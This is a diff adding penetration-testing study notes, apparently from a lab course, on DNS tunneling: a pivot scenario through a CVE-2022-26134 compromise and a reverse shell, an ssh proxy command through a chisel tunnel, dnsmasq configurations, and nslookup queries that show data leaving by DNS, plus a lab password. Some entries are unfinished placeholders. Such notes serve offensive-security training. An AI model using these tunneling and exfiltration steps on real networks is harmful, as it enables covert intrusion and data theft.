@@ -1687,6 +1687,55 @@ Reference
   - successfull ssh through chisel HTTP tunnel  
     `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215`
 - DNS Tunneling
+  ```
+  Pivot through CONFLUENCE01 (compromise CONFLUENCE01 by exploiting CVE-2022-26134) and ssh to PGDATABASE01
+  Reverse shell payload and create an SSH remote port forward to relay a port on our Kali machine to the SSH service on PGDATABASE01
+  SSH into PGDATABASE01 as the database_admin user
+  SSH to FELINEAUTHORITY (WAN) with username kali and password '7he_C4t_c0ntro11er'
+  2 open shells (PGDATABASE01:database_admin, FELINEAUTHORITY:kali)
+  ```
+  - Dnsmasq is lightweight DNS forwarder and DHCP server. This configuration ignores the /etc/resolv.conf and /etc/hosts
+    ```
+    kali@felineauthority:~$ cd dns_tunneling
+    kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf
+
+    # Do not read /etc/resolv.conf or /etc/hosts
+    no-resolv
+    no-hosts
+
+    # Define the zone
+    auth-zone=feline.corp
+    auth-server=feline.corp
+    ```
+  - Starting Dnsmasq with the basic configuration
+    `kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d`
+  - Another shell, Starting tcpdump on FELINEAUTHORITY
+    `kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53`
+  - Checking the configured DNS server on PGDATABASE01. >  Current DNS Server: 10.4.50.64 (MULTISERVER03)
+    `database_admin@pgdatabase01:~$ resolvectl status`
+  - Using nslookup to make a DNS request for exfiltrated-data.feline.corp > server can't find exfiltrated-data.feline.corp: NXDOMAIN
+    `database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp`
+  - DNS requests for exfiltrated-data.feline.corp coming in to FELINEAUTHORITY from MULTISERVER03
+    `04:57:40.721682 IP 192.168.50.64.65122 > 192.168.118.4.domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)`
+  - Checking the TXT configuration file then starting Dnsmasq with it.
+    ```
+    kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
+    # TXT record
+    txt-record=www.feline.corp,here's something useful!
+    txt-record=www.feline.corp,here's something else less useful.
+
+    kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
+    ```
+  - The TXT record response from www.feline.corp
+    ```
+    database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
+
+    Non-authoritative answer:
+    www.feline.corp	text = "here's something useful!"
+    www.feline.corp	text = "here's something else less useful."
+    ```
+  - ddd
+  - ddd
 - 
 ### 21. The metassploit framework
 ### 22. Active directory introduction and enumeration
